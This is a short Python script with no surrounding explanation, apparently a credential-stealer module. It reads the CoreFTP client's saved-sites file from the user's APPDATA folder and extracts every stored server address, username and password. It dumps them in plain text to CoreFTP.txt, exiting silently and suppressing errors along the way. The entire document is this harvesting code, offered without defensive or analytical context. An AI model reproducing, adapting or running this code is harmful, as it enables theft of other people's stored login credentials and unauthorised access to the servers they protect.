import os
import xml.etree.ElementTree as ET

folder_path = os.path.join(os.environ['APPDATA'], 'CoreFTP')
xml_file_path = os.path.join(folder_path, 'sites.xml')
lines_to_write = []
host_count = 0

if not os.path.exists(xml_file_path):
    exit()

try:
    xml_tree = ET.parse(xml_file_path)
    xml_root = xml_tree.getroot()

    for xml_node in xml_root.findall(".//Site"):
        url = xml_node.find('Address').text
        username = xml_node.find('Username').text
        password = xml_node.find('Password').text
        lines_to_write.append(f"Url: {url}\nUsername: {username}\nPassword: {password}\n\n")
        host_count += 1
except Exception:
    pass

if lines_to_write:
    with open("CoreFTP.txt", "w") as file:
        file.writelines(lines_to_write)
    print(f"Found {host_count} hosts.")
